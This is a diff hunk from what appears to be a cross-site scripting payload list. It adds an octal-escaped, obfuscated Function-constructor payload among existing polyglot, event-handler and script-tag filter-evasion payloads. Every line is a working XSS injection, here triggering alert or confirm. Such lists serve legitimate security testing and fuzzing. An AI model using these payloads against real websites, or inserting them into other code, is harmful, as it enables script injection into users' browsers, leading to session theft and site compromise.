@@ -7,6 +7,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <iframe/onload=aaajavascipt:alert(1)>
 JavaScript://%250Dtop.confirm(1)//?1
 <Img Src=OnXSS OnError=alert(1)>
+(()=>{})["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164()")()
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
